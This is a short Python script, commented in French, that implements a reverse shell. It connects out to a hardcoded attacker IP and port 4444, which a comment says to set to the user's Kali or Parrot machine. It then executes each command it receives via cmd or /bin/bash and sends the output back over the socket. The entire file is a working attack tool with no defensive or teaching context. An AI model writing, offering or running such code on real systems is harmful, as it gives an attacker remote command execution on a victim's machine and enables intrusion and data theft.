import socket
import subprocess
import os

# 🔁 Modifie cette IP par celle de ta machine (Kali/Parrot)
IP = "192.168.1.49"
PORT = 4444

s = socket.socket()
s.connect((IP, PORT))

# Redirige l'entrée/sortie de la socket vers bash/cmd
while True:
    try:
        data = s.recv(1024).decode("utf-8")
        if data.lower() == "exit":
            break
        # Change le shell selon OS
        if os.name == "nt":
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, executable="/bin/bash")
        output = cmd.stdout.read() + cmd.stderr.read()
        s.send(output)
    except Exception as e:
        break

s.close()
